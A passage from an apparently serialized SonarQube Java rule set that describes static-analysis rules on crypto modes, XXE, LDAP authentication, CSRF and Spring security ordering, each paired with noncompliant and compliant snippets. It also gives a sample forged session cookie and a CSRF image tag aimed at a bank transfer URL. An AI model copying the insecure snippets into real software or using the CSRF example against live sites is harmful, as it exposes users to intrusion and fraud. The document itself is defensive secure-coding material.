     &lt;filter-name&gt;ValidationFilter&lt;/filter-name&gt;
     &lt;filter-class&gt;com.myco.servlet.ValidationFilter&lt;/filter-class&gt;
  &lt;/filter&gt;

  &lt;filter-mapping&gt;
     &lt;filter-name&gt;ValidationFilter&lt;/filter-name&gt;
     &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
  &lt;/filter-mapping&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
</ul>ZVULNERABILITY
˚

java:S1175Ï
javaS1175FThe signature of "finalize()" should match that of "Object.finalize()""CRITICAL*java:ˇ<p><code>Object.finalize()</code> is called by the Garbage Collector at some point after the object becomes unreferenced.</p>
<p>In general, overloading <code>Object.finalize()</code> is a bad idea because:</p>
<ul>
  <li> The overload may not be called by the Garbage Collector. </li>
  <li> Users are not expected to call <code>Object.finalize()</code> and will get confused. </li>
</ul>
<p>But beyond that it's a terrible idea to name a method "finalize" if it doesn't actually override <code>Object.finalize()</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int finalize(int someParameter) {        // Noncompliant
  /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int someBetterName(int someParameter) {  // Compliant
  /* ... */
}
</pre>ZBUG
ê

java:S1174Å
javaS1174K"Object.finalize()" should remain protected (versus public) when overriding"CRITICAL*java:à<p>The contract of the <code>Object.finalize()</code> method is clear: only the Garbage Collector is supposed to call this method.</p>
<p>Making this method public is misleading, because it implies that any caller can use it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  @Override
  public void finalize() {    // Noncompliant
    /* ... */
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/583.html">MITRE, CWE-583</a> - finalize() Method Declared Public </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/H4cbAQ">CERT, MET12-J.</a> - Do not use finalizers </li>
</ul>Z
CODE_SMELL
‚


java:S2157”

javaS2157%"Cloneables" should implement "clone""CRITICAL*java:Ä
<p>Simply implementing <code>Cloneable</code> without also overriding <code>Object.clone()</code> does not necessarily make the class cloneable. While
the <code>Cloneable</code> interface does not include a <code>clone</code> method, it is required by convention, and ensures true cloneability.
Otherwise the default JVM <code>clone</code> will be used, which copies primitive values and object references from the source to the target. I.e.
without overriding <code>clone</code>, any cloned instances will potentially share members with the source instance.</p>
<p>Removing the <code>Cloneable</code> implementation and providing a good copy constructor is another viable (some say preferable) way of allowing a
class to be copied.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Team implements Cloneable {  // Noncompliant
  private Person coach;
  private List&lt;Person&gt; players;
  public void addPlayer(Person p) {...}
  public Person getCoach() {...}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Team implements Cloneable {
  private Person coach;
  private List&lt;Person&gt; players;
  public void addPlayer(Person p) { ... }
  public Person getCoach() { ... }

  @Override
  public Object clone() {
    Team clone = (Team) super.clone();
    //...
  }
}
</pre>Z
CODE_SMELL
Û

java:S1067‰
javaS1067%Expressions should not be too complex"CRITICAL*java:ë<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code>
operators it contains.</p>
<p>A single expression's complexity should not become too high to keep the code readable.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value of 3:</p>
<pre>
if (((condition1 &amp;&amp; condition2) || (condition3 &amp;&amp; condition4)) &amp;&amp; condition5) { ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
if ( (myFirstCondition() || mySecondCondition()) &amp;&amp; myLastCondition()) { ... }
</pre>
<h2>Exceptions</h2>
<p>No issue is reported inside <code>equals</code> methods, because it is common to compare all the fields of a class for equality inside this kind of
method.</p>Z
CODE_SMELL
∆

java:S2277∑
javaS2277cCryptographic RSA algorithms should always incorporate OAEP (Optimal Asymmetric Encryption Padding)"CRITICAL*java:£
<p>Without OAEP in RSA encryption, it takes less work for an attacker to decrypt the data or infer patterns from the ciphertext. This rule logs an
issue as soon as a literal value starts with <code>RSA/NONE</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
Cipher rsa = javax.crypto.Cipher.getInstance("RSA/NONE/NoPadding");
</pre>
<h2>Compliant Solution</h2>
<pre>
Cipher rsa = javax.crypto.Cipher.getInstance("RSA/ECB/OAEPWITHSHA-256ANDMGF1PADDING");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/780.html">MITRE CWE-780</a> - Use of RSA Algorithm without OAEP </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#RSA_NO_PADDING">RSA NoPadding Unsafe</a> </li>
</ul>ZVULNERABILITY
¶

java:S2274ó
javaS2274T"Object.wait(...)" and "Condition.await(...)" should be called inside a "while" loop"CRITICAL*java:ï<p>According to the documentation of the Java <code>Condition</code> interface:</p>
<blockquote>
  <p>When waiting upon a <code>Condition</code>, a "spurious wakeup" is permitted to occur, in general, as a concession to the underlying platform
  semantics. This has little practical impact on most application programs as a Condition should always be waited upon in a loop, testing the state
  predicate that is being waited for. An implementation is free to remove the possibility of spurious wakeups but it is recommended that applications
  programmers always assume that they can occur and so always wait in a loop.</p>
</blockquote>
<p>The same advice is also found for the <code>Object.wait(...)</code> method:</p>
<blockquote>
  <p>waits should always occur in loops, like this one:</p>
  <pre>
synchronized (obj) {
  while (&lt;condition does not hold&gt;){
    obj.wait(timeout);
  }
   ... // Perform action appropriate to condition
}
</pre>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
synchronized (obj) {
  if (!suitableCondition()){
    obj.wait(timeout);   //the thread can wake up even if the condition is still false
  }
   ... // Perform action appropriate to condition
}
</pre>
<h2>Compliant Solution</h2>
<pre>
synchronized (obj) {
  while (!suitableCondition()){
    obj.wait(timeout);
  }
   ... // Perform action appropriate to condition
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9QIhAQ">CERT THI03-J.</a> - Always invoke wait() and await() methods inside a loop
  </li>
</ul>Z
CODE_SMELL
˙

java:S1186Î
javaS1186Methods should not be empty"CRITICAL*java:¢<p>There are several reasons for a method not to have a method body:</p>
<ul>
  <li> It is an unintentional omission, and should be fixed to prevent an unexpected behavior in production. </li>
  <li> It is not yet, or never will be, supported. In this case an <code>UnsupportedOperationException</code> should be thrown. </li>
  <li> The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething() {
}

public void doSomethingElse() {
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Override
public void doSomething() {
  // Do nothing because of X and Y.
}

@Override
public void doSomethingElse() {
  throw new UnsupportedOperationException();
}
</pre>
<h2>Exceptions</h2>
<p>Default (no-argument) constructors are ignored when there are other constructors in the class, as are empty methods in abstract classes.</p>
<pre>
public abstract class Animal {
  void speak() {  // default implementation ignored
  }
}
</pre>Z
CODE_SMELL
∞	

java:S4454°	
javaS4454:"equals" method parameters should not be marked "@Nonnull""CRITICAL*java:π<p>By contract, the <code>equals(Object)</code> method, from <code>java.lang.Object</code>, should accept a <code>null</code> argument. Among all the
other cases, the <code>null</code> case is even explicitly detailed in the <code>Object.equals(...)</code> Javadoc, stating "_For any non-null
reference value x, x.equals(null) should return false._"</p>
<p>Assuming that the argument to <code>equals</code> is always non-null, and enforcing that assumption with an annotation is not only a fundamental
violation of the contract of <code>equals</code>, but it is also likely to cause problems in the future as the use of the class evolves over time.</p>
<p>The rule raises an issue when the <code>equals</code> method is overridden and its parameter annotated with any kind of <code>@Nonnull</code>
annotation.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean equals(@javax.annotation.Nonnull Object obj) { // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean equals(Object obj) {
  if (obj == null) {
    return false;
  }
  // ...
}
</pre>Z
CODE_SMELL
Ì	

java:S2151ﬁ	
javaS2151*"runFinalizersOnExit" should not be called"CRITICAL*java:ç	<p>Running finalizers on JVM exit is disabled by default. It can be enabled with <code>System.runFinalizersOnExit</code> and
<code>Runtime.runFinalizersOnExit</code>, but both methods are deprecated because they are are inherently unsafe. </p>
<p>According to the Oracle Javadoc:</p>
<blockquote>
  <p>It may result in finalizers being called on live objects while other threads are concurrently manipulating those objects, resulting in erratic
  behavior or deadlock.</p>
</blockquote>
<p>If you really want to be execute something when the virtual machine begins its shutdown sequence, you should attach a shutdown hook. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public static void main(String [] args) {
  ...
  System.runFinalizersOnExit(true);  // Noncompliant
  ...
}

protected void finalize(){
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static void main(String [] args) {
  Runtime.addShutdownHook(new Runnable() {
    public void run(){
      doSomething();
    }
  });
  //...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/H4cbAQ">CERT, MET12-J.</a> - Do not use finalizers </li>
</ul>ZBUG
•


java:S2390ñ

javaS2390DClasses should not access their own subclasses during initialization"CRITICAL*java:§	<p>When a parent class references a member of a subclass during its own initialization, the results might not be what you expect because the child
class might not have been initialized yet. This could create what is known as an "initialisation cycle", or even a deadlock in some extreme cases.</p>
<p>To make things worse, these issues are very hard to diagnose so it is highly recommended you avoid creating this kind of dependencies.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Parent {
  static int field1 = Child.method(); // Noncompliant
  static int field2 = 42;

  public static void main(String[] args) {
    System.out.println(Parent.field1); // will display "0" instead of "42"
  }
}

class Child extends Parent {
  static int method() {
    return Parent.field2;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/display/java/DCL00-J.+Prevent+class+initialization+cycles">CERT, DCL00-J.</a> - Prevent
  class initialization cycles </li>
  <li> Java Language Specifications - <a href="https://docs.oracle.com/javase/specs/jls/se8/html/jls-12.html#jls-12.4">Section 12.4: Initialization of
  Classes and Interfaces</a> </li>
</ul>Z
CODE_SMELL
Ì

java:S2122ﬁ
javaS2122<"ScheduledThreadPoolExecutor" should not have 0 core threads"CRITICAL*java:˚<p><code>java.util.concurrent.ScheduledThreadPoolExecutor</code>'s pool is sized with <code>corePoolSize</code>, so setting <code>corePoolSize</code>
to zero means the executor will have no threads and run nothing.</p>
<p>This rule detects instances where <code>corePoolSize</code> is set to zero, via either its setter or the object constructor.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void do(){

  ScheduledThreadPoolExecutor stpe1 = new ScheduledThreadPoolExecutor(0); // Noncompliant

  ScheduledThreadPoolExecutor stpe2 = new ScheduledThreadPoolExecutor(POOL_SIZE);
  stpe2.setCorePoolSize(0);  // Noncompliant
</pre>ZBUG
ô

java:S4435ä
javaS4435"XML transformers should be secured"CRITICAL*java:∑<p>An XML External Entity or XSLT External Entity (XXE) vulnerability can occur when a <code>javax.xml.transform.Transformer</code> is created without
enabling "Secure Processing" or when one is created without disabling resolving of both external DTDs and DTD entities. If that external data is being
controlled by an attacker it may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the
perspective of the machine where the parser is located, and other system impacts.</p>
<p>This rule raises an issue when a <code>Transformer</code> is created without either of these settings.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Transformer transformer = TransformerFactory.newInstance().newTransformer();
transformer.transform(input, result);
</pre>
<h2>Compliant Solution</h2>
<p>Recommended:</p>
<pre>
TransformerFactory factory = TransformerFactory.newInstance();
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");

Transformer transformer = factory.newTransformer();

transformer.transform(input, result);
</pre>
<p>Implementation dependent:</p>
<pre>
TransformerFactory factory = TransformerFactory.newInstance();
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

Transformer transformer = factory.newTransformer();

transformer.transform(input, result);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)">OWASP Top 10 2017 Category A4</a> - XML External Entities
  (XXE) </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#transformerfactory">OWASP XXE Cheat
  Sheet</a> </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/611.html">MITRE, CWE-611</a> - Improper Restriction of XML External Entity Reference ('XXE')
  </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#XXE_DTD_TRANSFORM_FACTORY">XXE_DTD_TRANSFORM_FACTORY</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#XXE_XSLT_TRANSFORM_FACTORY">XXE_XSLT_TRANSFORM_FACTORY</a>
  </li>
</ul>ZVULNERABILITY


java:S2254·
javaS2254?"HttpServletRequest.getRequestedSessionId()" should not be used"CRITICAL*java:Ò<p>According to the Oracle Java API, the <code>HttpServletRequest.getRequestedSessionId()</code> method:</p>
<blockquote>
  <p>Returns the session ID specified by the client. This may not be the same as the ID of the current valid session for this request. If the client
  did not specify a session ID, this method returns null.</p>
</blockquote>
<p>The session ID it returns is either transmitted in a cookie or a URL parameter so by definition, nothing prevents the end-user from manually
updating the value of this session ID in the HTTP request. </p>
<p>Here is an example of a updated HTTP header:</p>
<pre>
GET /pageSomeWhere HTTP/1.1
Host: webSite.com
User-Agent: Mozilla/5.0
Cookie: JSESSIONID=Hacked_Session_Value'''"&gt;
</pre>
<p>Due to the ability of the end-user to manually change the value, the session ID in the request should only be used by a servlet container (E.G.
Tomcat or Jetty) to see if the value matches the ID of an an existing session. If it does not, the user should be considered unauthenticated.
Moreover, this session ID should never be logged to prevent hijacking of active sessions.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(isActiveSession(request.getRequestedSessionId()) ){
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/807">MITRE, CWE-807</a> - Reliance on Untrusted Inputs in a Security Decision </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>ZVULNERABILITY
⁄

java:S4433À
javaS4433(LDAP connections should be authenticated"CRITICAL*java:Ú<p>An un-authenticated LDAP connection can lead to transactions without access control. Authentication, and with it, access control, are the last line
of defense against LDAP injections and should not be disabled.</p>
<p>This rule raises an issue when an LDAP connection is created with <code>Context.SECURITY_AUTHENTICATION</code> set to <code>"none"</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
// Set up the environment for creating the initial context
Hashtable&lt;String, Object&gt; env = new Hashtable&lt;String, Object&gt;();
env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
env.put(Context.PROVIDER_URL, "ldap://localhost:389/o=JNDITutorial");

// Use anonymous authentication
env.put(Context.SECURITY_AUTHENTICATION, "none"); // Noncompliant

// Create the initial context
DirContext ctx = new InitialDirContext(env);
</pre>
<h2>Compliant Solution</h2>
<pre>
// Set up the environment for creating the initial context
Hashtable&lt;String, Object&gt; env = new Hashtable&lt;String, Object&gt;();
env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
env.put(Context.PROVIDER_URL, "ldap://localhost:389/o=JNDITutorial");

// Use simple authentication
env.put(Context.SECURITY_AUTHENTICATION, "simple");
env.put(Context.SECURITY_PRINCIPAL, "cn=S. User, ou=NewHires, o=JNDITutorial");
env.put(Context.SECURITY_CREDENTIALS, getLDAPPassword());

// Create the initial context
DirContext ctx = new InitialDirContext(env);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/521.html">CWE-521</a> - Weak Password Requirements </li>
  <li> <a href="https://docs.oracle.com/javase/tutorial/jndi/ldap/authentication.html">Modes of Authenticating to LDAP</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#LDAP_ANONYMOUS">LDAP_ANONYMOUS</a> </li>
</ul>ZVULNERABILITY
Ç

java:S4432Û
javaS44329AES encryption algorithm should be used with secured mode"CRITICAL*java:â<p>The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Some combinations are not secured:</p>
<ul>
  <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it does
  not hide data patterns well. In some senses, it doesn't provide serious message confidentiality, and it is not recommended for use in cryptographic
  protocols at all. </li>
  <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>
</ul>
<p>In both cases, Galois/Counter Mode (GCM) with no padding should be preferred.</p>
<p>This rule raises an issue when a <code>Cipher</code> instance is created with either ECB or CBC/PKCS5Padding mode.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Cipher c1 = Cipher.getInstance("AES/ECB/NoPadding"); // Noncompliant
Cipher c2 = Cipher.getInstance("AES/CBC/PKCS5Padding"); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/VwAZAg">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf">Recommendation for Block Cipher Modes of Operation</a>
  </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#ECB_MODE">ECB_MODE</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#PADDING_ORACLE">PADDING_ORACLE</a> </li>
</ul>ZVULNERABILITY
Ω

java:S1163Æ
javaS11631Exceptions should not be thrown in finally blocks"CRITICAL*java:œ<p>Throwing an exception from within a finally block will mask any exception which was previously thrown in the <code>try</code> or <code>catch</code>
block, and the masked's exception message and stack trace will be lost.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  /* some work which end up throwing an exception */
  throw new IllegalArgumentException();
} finally {
  /* clean up */
  throw new RuntimeException();       // Noncompliant; masks the IllegalArgumentException
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  /* some work which end up throwing an exception */
  throw new IllegalArgumentException();
} finally {
  /* clean up */
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/soUbAQ">CERT, ERR05-J.</a> - Do not let checked exceptions escape from a finally block
  </li>
</ul>Z
CODE_SMELL
¸

java:S1541Ì
javaS1541!Methods should not be too complex"CRITICAL*java:û<p>The cyclomatic complexity of methods should not exceed a defined threshold.</p>
<p>Complex code can perform poorly and will in any case be difficult to understand and therefore to maintain.</p>
<h2>Exceptions</h2>
<p>While having a large number of fields in a class may indicate that it should be split, this rule nonetheless ignores high complexity in
<code>equals</code> and <code>hashCode</code> methods.</p>Z
CODE_SMELL
ù


java:S2638é

javaS2638,Method overrides should not change contracts"CRITICAL*java:¥	<p>Because a subclass instance may be cast to and treated as an instance of the superclass, overriding methods should uphold the aspects of the
superclass contract that relate to the Liskov Substitution Principle. Specifically, if the parameters or return type of the superclass method are
marked with any of the following: <code>@Nullable</code>, <code>@CheckForNull</code>, <code>@NotNull</code>, <code>@NonNull</code>, and
<code>@Nonnull</code>, then subclass parameters are not allowed to tighten the contract, and return values are not allowed to loosen it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit {

  private Season ripe;
  private String color;

  public void setRipe(@Nullable Season ripe) {
    this.ripe = ripe;
  }

  public @NotNull Integer getProtein() {
    return 12;
  }
}

public class Raspberry extends Fruit {

  public void setRipe(@NotNull Season ripe) {  // Noncompliant
    this.ripe = ripe;
  }

  public @Nullable Integer getProtein() {  // Noncompliant
    return null;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/Liskov_substitution_principle">https://en.wikipedia.org/wiki/Liskov_substitution_principle</a> </li>
</ul>Z
CODE_SMELL
Â

java:S1994÷
javaS1994>"for" loop increment clauses should modify the loops' counters"CRITICAL*java:Í<p>It can be extremely confusing when a <code>for</code> loop's counter is incremented outside of its increment clause. In such cases, the increment
should be moved to the loop's increment clause if at all possible.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (i = 0; i &lt; 10; j++) { // Noncompliant
  // ...
  i++;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (i = 0; i &lt; 10; i++, j++) {
  // ...
}
</pre>
<p>Or </p>
<pre>
for (i = 0; i &lt; 10; i++) {
  // ...
  j++;
}
</pre>Z
CODE_SMELL
˝

java:S3937Ó
javaS3937!Number patterns should be regular"CRITICAL*java:ü<p>The use of punctuation characters to separate subgroups in a number can make the number more readable. For instance consider 1,000,000,000 versus
1000000000. But when the grouping is irregular, such as 1,000,00,000; it indicates an error. </p>
<p>This rule raises an issue when underscores (<code>_</code>) are used to break a number into irregular subgroups.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int duos = 1_00_00;
int million = 1_000_00_000;  // Noncompliant
int thousand = 1000;
int tenThousand = 100_00;  // Noncompliant
</pre>Z
CODE_SMELL
®

java:S3822ô
javaS3822,Hibernate should not update database schemas"CRITICAL*java:∆<p>The use of any value but <code>"validate"</code> for <code>hibernate.hbm2ddl.auto</code> may cause the database schema used by your application to
be changed, dropped, or cleaned of all data. In short, the use of this property is risky, and should only be used in production with the
<code>"validate"</code> option, if it is used at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;session-factory&gt;
  &lt;property name="hibernate.hbm2ddl.auto"&gt;update&lt;/property&gt;  &lt;!-- Noncompliant --&gt;
&lt;/session-factory&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;session-factory&gt;
  &lt;property name="hibernate.hbm2ddl.auto"&gt;validate&lt;/property&gt;  &lt;!-- Compliant --&gt;
&lt;/session-factory&gt;
</pre>
<p>or</p>
<pre>
&lt;session-factory&gt;
  &lt;!-- Property deleted --&gt;
&lt;/session-factory&gt;
</pre>ZBUG
¿


java:S2976±

javaS2976>"File.createTempFile" should not be used to create a directory"CRITICAL*java:¬	<p>Using <code>File.createTempFile</code> as the first step in creating a temporary directory causes a race condition and is inherently unreliable and
insecure. Instead, <code>Files.createTempDirectory</code> (Java 7+) or a library function such as Guava's similarly-named
<code>Files.createTempDir</code> should be used.</p>
<p>This rule raises an issue when the following steps are taken in immediate sequence:</p>
<ul>
  <li> call to <code>File.createTempFile</code> </li>
  <li> delete resulting file </li>
  <li> call <code>mkdir</code> on the File object </li>
</ul>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
File tempDir;
tempDir = File.createTempFile("", ".");
tempDir.delete();
tempDir.mkdir();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Path tempPath = Files.createTempDirectory("");
File tempDir = tempPath.toFile();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities">OWASP Top 10 2017 Category A9</a> - Using
  Components with Known Vulnerabilities </li>
</ul>ZVULNERABILITY
”


java:S1214ƒ

javaS1214-Constants should not be defined in interfaces"CRITICAL*java:È	<p>According to Joshua Bloch, author of "Effective Java":</p>
<blockquote>
  <p>The constant interface pattern is a poor use of interfaces. </p>
  <p>That a class uses some constants internally is an implementation detail.</p>
  <p>Implementing a constant interface causes this implementation detail to leak into the class's exported API. It is of no consequence to the users
  of a class that the class implements a constant interface. In fact, it may even confuse them. Worse, it represents a commitment: if in a future
  release the class is modified so that it no longer needs to use the constants, it still must implement the interface to ensure binary compatibility.
  If a nonfinal class implements a constant interface,</p>
  <p>all of its subclasses will have their namespaces polluted by the constants in the interface.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
interface Status {                      // Noncompliant
   int OPEN = 1;
   int CLOSED = 2;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public enum Status {                    // Compliant
  OPEN,
  CLOSED;
}
</pre>
<p>or</p>
<pre>
public final class Status {             // Compliant
   public static final int OPEN = 1;
   public static final int CLOSED = 2;
}
</pre>Z
CODE_SMELL
û

java:S3752è
javaS37524"@RequestMapping" methods should specify HTTP method"CRITICAL*java:™<p>A <code>@RequestMapping</code> method handles all matching requests by default. That means that a method you intended only to be
<code>POST</code>-ed to could also be called by a <code>GET</code>, thereby allowing hackers to call the method inappropriately. For example a
"transferFunds" method might be invoked like so: <code>&lt;img
src="http://bank.com/actions/transferFunds?reciepientRouting=000000&amp;receipientAccount=11111111&amp;amount=200.00" width="1"
height="1"/&gt;</code></p>
<p>For that reason, you should always explicitly list the single HTTP method with which you expect your <code>@RequestMapping</code> Java method to be
called. This rule raises an issue when <code>method</code> is missing and when the <code>method</code> parameter is configured with more than one
verb. Mixing GET and POST verbs can lead to information leakage. It's easier to setup Spring Security‚Äôs CSRF protection when there is only one verb
per <code>@RequestMapping</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@RequestMapping("/greet")  // Noncompliant
public String greet(String greetee) {
}

@RequestMapping(path = "/delete", method = {RequestMethod.GET, RequestMethod.POST}) // Noncompliant
String delete(@RequestParam("id") String id) {
  return "Hello from delete";
}
</pre>
<h2>Compliant Solution</h2>
<pre>
  @RequestMapping("/greet", method = GET)
  public String greet(String greetee) {
  }

  @RequestMapping(path = "/delete", method = RequestMethod.GET)
  String delete(@RequestParam("id") String id) {
   return "Hello from delete";
  }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/352.html">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>
  <li> <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29">OWASP: Cross-Site Request Forgery</a> </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat1">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> <a href="https://docs.spring.io/spring-security/site/docs/5.0.x/reference/html/csrf.html#csrf-use-proper-verbs">Spring Security Official
  Documentation: Use proper HTTP verbs (CSRF protection)</a> </li>
</ul>ZVULNERABILITY
ˇ

java:S4601
javaS46017"HttpSecurity" URL patterns should be correctly ordered"CRITICAL*java:à<p>URL patterns configured on a <code>HttpSecurity.authorizeRequests()</code> method are considered in the order they were declared. It's easy to do a
mistake and to declare a less restrictive configuration before a more restrictive one. Therefore, it's required to review the order of the
"antMatchers" declarations. The <code>/**</code> one should be the last one if it is declared.</p>
<p>This rule raises an issue when:</p>
<p>- A pattern is preceded by another that ends with <code>**</code> and has the same beginning. E.g.: <code>/page*-admin/db/**</code> is after
<code>/page*-admin/**</code></p>
<p>- A pattern without wildcard characters is preceded by another that matches. E.g.: <code>/page-index/db</code> is after <code>/page*/**</code></p>
<h2>Noncompliant Code Example</h2>
<pre>
  protected void configure(HttpSecurity http) throws Exception {
    http.authorizeRequests()
      .antMatchers("/resources/**", "/signup", "/about").permitAll() // Compliant
      .antMatchers("/admin/**").hasRole("ADMIN")
      .antMatchers("/admin/login").permitAll() // Noncompliant; the pattern "/admin/login" should occurs before "/admin/**"
      .antMatchers("/**", "/home").permitAll()
      .antMatchers("/db/**").access("hasRole('ADMIN') and hasRole('DBA')") // Noncompliant; the pattern "/db/**" should occurs before "/**"
      .and().formLogin().loginPage("/login").permitAll().and().logout().permitAll();
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
  protected void configure(HttpSecurity http) throws Exception {
    http.authorizeRequests()
      .antMatchers("/resources/**", "/signup", "/about").permitAll() // Compliant
      .antMatchers("/admin/login").permitAll()
      .antMatchers("/admin/**").hasRole("ADMIN") // Compliant
      .antMatchers("/db/**").access("hasRole('ADMIN') and hasRole('DBA')")
      .antMatchers("/**", "/home").permitAll() // Compliant; "/**" is the last one
      .and().formLogin().loginPage("/login").permitAll().and().logout().permitAll();
  }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
